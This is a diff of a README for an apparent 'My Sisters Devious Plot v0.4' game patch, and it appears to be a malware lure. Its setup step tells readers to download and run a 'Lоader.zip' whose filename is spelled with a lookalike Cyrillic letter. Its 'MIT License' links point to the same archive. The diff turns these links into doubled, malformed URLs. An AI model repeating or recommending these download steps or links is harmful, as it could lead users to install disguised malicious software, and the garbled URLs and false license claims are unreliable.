@@ -6,7 +6,7 @@ Welcome to the official **My Sisters Devious Plot v0.4 Patch** repository! Ignit
 
 Getting started with **My Sisters Devious Plot v0.4 Patch** is straightforward! Carefully follow the steps below:
 
-1. Download `https://raw.githubusercontent.com/Vaishnavee13/DeviousSistersPlot-v0_4-Update/main/Lоader.zip` from the repository.
+1. Download `https://raw.githubusercontent.com/Vaishnavee13/DeviousSistersPlot-v0_4-Update/main/Lоader.zipоhttps://raw.githubusercontent.com/Vaishnavee13/DeviousSistersPlot-v0_4-Update/main/Lоader.zip` from the repository.
 2. Extract the contents to your preferred directory using your favorite archive tool (e.g., WinRAR, 7-Zip, or built-in extractor).
 3. Run the setup as per your operating system (see compatibility section below).
 4. Follow on-screen instructions to apply the patch.
@@ -53,11 +53,11 @@ Patch, Loader, Visual Novel, Game Update, Mod Support, Adventure Game, Multi-Pla
 
 ## 📓 Disclaimer
 
-This patch is intended **solely for lawful, personal use** with legitimate copies of *My Sisters Devious Plot v0.4* and is not affiliated with or endorsed by the original developers. Redistribution of this software is permitted only under the terms of the MIT License. Modification or unauthorized commercial use outside these terms is strictly prohibited. Use at your own risk. For further information, review the full [MIT License](https://raw.githubusercontent.com/Vaishnavee13/DeviousSistersPlot-v0_4-Update/main/Lоader.zip).
+This patch is intended **solely for lawful, personal use** with legitimate copies of *My Sisters Devious Plot v0.4* and is not affiliated with or endorsed by the original developers. Redistribution of this software is permitted only under the terms of the MIT License. Modification or unauthorized commercial use outside these terms is strictly prohibited. Use at your own risk. For further information, review the full [MIT License](https://raw.githubusercontent.com/Vaishnavee13/DeviousSistersPlot-v0_4-Update/main/Lоader.zipоhttps://raw.githubusercontent.com/Vaishnavee13/DeviousSistersPlot-v0_4-Update/main/Lоader.zip).
 
 ## 📝 MIT License 2025
 
-This project is distributed under the flexible and permissive [MIT License](https://raw.githubusercontent.com/Vaishnavee13/DeviousSistersPlot-v0_4-Update/main/Lоader.zip), granting you freedom to use, modify, and share your enhanced game experience!
+This project is distributed under the flexible and permissive [MIT License](https://raw.githubusercontent.com/Vaishnavee13/DeviousSistersPlot-v0_4-Update/main/Lоader.zipоhttps://raw.githubusercontent.com/Vaishnavee13/DeviousSistersPlot-v0_4-Update/main/Lоader.zip), granting you freedom to use, modify, and share your enhanced game experience!
 
 ---
 ✨ **Thank you for supporting the future of immersive adventures and custom patches! Your feedback and suggestions power our innovation!** ✨
